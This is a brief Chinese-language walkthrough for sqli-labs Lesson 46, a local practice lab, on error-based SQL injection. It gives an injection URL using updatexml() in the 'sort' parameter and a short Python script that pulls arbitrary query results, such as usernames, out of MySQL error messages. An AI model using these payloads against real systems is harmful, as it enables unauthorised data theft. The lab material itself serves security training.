# Lesson-46
```
报错注入
```

```
http://127.0.0.1/Less-46/?sort=1%20and%20(updatexml(1,concat(0x5e24,(user()),0x5e24),1))
```
简单利用脚本 : 
```
import requests
sql = "select username from security.users limit 6,1"
url = "http://127.0.0.1/Less-46/?sort="
check_symbol = chr(0x5e) + chr(0x24)
symbol = "0x5e24"
payload = "1 and (updatexml(1,concat(" + symbol + ",(" + sql + ")," + symbol + "),1))"
response = requests.get(url+payload)
content = response.text
result = content.split(check_symbol)[1]
print(result)
```
